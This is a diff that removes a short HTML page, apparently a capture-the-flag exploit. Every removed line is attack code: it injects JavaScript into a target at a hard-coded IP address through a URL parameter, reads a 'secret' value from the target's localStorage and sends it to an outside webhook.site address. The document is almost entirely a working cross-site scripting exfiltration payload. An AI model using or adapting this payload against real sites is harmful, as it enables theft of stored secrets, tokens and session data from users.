@@ -1,15 +1,1 @@
-<body>
-<script>
-const TARGET_BASE_URL = "http://91.107.168.3:8000";
 
-const HOOK_URL = "https://webhook.site/ece1bbd4-1021-47b0-8ca7-b637df12b93f";
-
-const elm = document.createElement("iframe");
-elm.src = `${TARGET_BASE_URL}?p=${encodeURIComponent(`
-  const w = open("${TARGET_BASE_URL}");
-  const flag = w.localStorage.getItem("secret");
-  fetch("${HOOK_URL}?q="+flag);
-`)}`;
-document.body.appendChild(elm);
-</script>
-</body>
